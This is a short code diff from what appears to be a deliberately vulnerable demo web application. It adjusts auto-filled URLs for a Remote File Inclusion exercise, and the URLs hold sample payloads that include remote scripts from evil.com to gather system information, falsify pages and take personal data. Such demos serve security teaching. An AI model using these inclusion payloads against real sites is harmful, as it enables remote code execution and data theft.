@@ -24,16 +24,16 @@
         //auto input
         switch(mcode){
           case "1":
-            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://valune/include.php");
+            $("#user_browsing_url").val("//" + domain + "/vulne/front/RemoteFileInclusion.php?page=http://valune/include.php");
             break;
           case "2":
-            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/systeminfo.php");
+            $("#user_browsing_url").val("//" + domain + "/vulne/front/RemoteFileInclusion.php?page=http://evil.com/systeminfo.php");
             break;
           case "3":
-            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/falsification.php");
+            $("#user_browsing_url").val("//" + domain + "/vulne/front/RemoteFileInclusion.php?page=http://evil.com/falsification.php");
             break;
           case "4":
-            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/parsonaldata.php");
+            $("#user_browsing_url").val("//" + domain + "/vulne/front/RemoteFileInclusion.php?page=http://evil.com/parsonaldata.php");
             break;
         }
       }
